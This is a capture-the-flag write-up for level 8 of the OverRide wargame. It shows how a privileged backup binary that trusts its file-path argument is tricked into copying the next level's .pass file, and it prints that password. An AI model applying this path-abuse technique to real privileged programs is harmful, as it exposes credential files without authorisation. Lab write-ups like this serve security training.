# level8

## Code
```c
  v4 = fopen("./backups/.log", "w");

  stream = fopen(argv[1], "r");

  strcpy(dest, "./backups/");
  strncat(dest, argv[1], 99 - strlen(dest));
  fd = open(dest, O_WRONLY | O_CREAT, 0660);
```
There are 3 files they open in the binary.

1. it opens `./backups/.log` with `write`.
2. it opens `argv[1]` -> `stream` with `read`.
3. it opens a file name, `./backups/<argv[1]>`.

### `./backups`
To make first `open` works, we should create `backups` directory in where we run the command. 
```bash
# bad example
level08@OverRide:/tmp$ ~/level08 hi
ERROR: Failed to open ./backups/.log
# good example
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ ~/level08 hi
ERROR: Failed to open hi # it's another problem. :)
```

### `argv[1]`
To make second `open` works, we should create a file has same name of `argv[1]`.
```bash 
# bad example
level08@OverRide:/tmp$ ~/level08 hi
ERROR: Failed to open hi
# good example
level08@OverRide:/tmp$ echo "hello I'm hi" > hi
level08@OverRide:/tmp$ ~/level08 hi
level08@OverRide:/tmp$ cat backups/hi
hello I'm hi
```
They open the file we put as `argv[1]` and read it the contents and write them in `./backups/<argv[1]>`. 
So we will try to read `.pass` file directly.

## Payload

First, we should make all directory we need.
```bash
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09
level08@OverRide:/tmp$ ls -Rl
.:
total 0
drwxrwxr-x 3 level08 level08 80 Jul  7 20:47 backups

./backups:
total 0
drwxrwxr-x 3 level08 level08 60 Jul  7 20:47 home

./backups/home:
total 0
drwxrwxr-x 3 level08 level08 60 Jul  7 20:47 users

./backups/home/users:
total 0
drwxrwxr-x 2 level08 level08 40 Jul  7 20:47 level09

./backups/home/users/level09:
total 0
```

Then, just run the command!
```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

Now it must be there!
```bash
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```